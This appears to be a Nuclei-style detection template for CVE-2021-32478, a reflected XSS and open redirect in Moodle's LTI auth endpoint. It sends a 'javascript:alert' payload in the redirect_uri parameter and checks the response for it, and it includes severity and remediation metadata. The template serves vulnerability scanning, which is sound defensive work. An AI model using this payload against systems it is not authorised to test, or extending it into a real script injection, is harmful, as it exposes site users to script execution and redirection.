http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '{{randstr}}'
    - <form action="javascript:alert
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/mod/lti/auth.php?redirect_uri=javascript:alert(''{{randstr}}'')'
id: CVE-2021-32478
info:
  author: hackergautam
  classification:
    cpe: cpe:2.3:a:moodle:moodle:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-32478
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.87661
    epss-score: 0.03754
  description: 'Moodle versions 3.10 to 3.10.3, 3.9 to 3.9.6, 3.8 to 3.8.8 contain
    a reflected XSS and open redirect caused by insufficient sanitization of the redirect
    URI in the LTI authorization endpoint, letting attackers execute scripts or redirect
    users maliciously, exploit requires crafted URL with malicious redirect URI.

    '
  impact: 'Attackers can inject malicious JavaScript or redirect users to malicious
    sites via insufficient sanitization in the redirect_uri parameter.

    '
  metadata:
    max-request: 1
    product: moodle
    vendor: moodle
    verified: true
  name: Moodle 3.8-3.10.3 - Reflected XSS & Open Redirect
  reference:
  - https://twitter.com/JacksonHHax/status/1391367064154042377
  - https://nvd.nist.gov/vuln/detail/CVE-2021-32478
  - https://moodle.org/mod/forum/discuss.php?d=422314
  remediation: 'Upgrade to Moodle version 3.8.9, 3.9.7, or 3.10.4 or later.

    '
  severity: medium
  tags: cve,cve2021,moodle,xss,intrusive,vuln,vkev
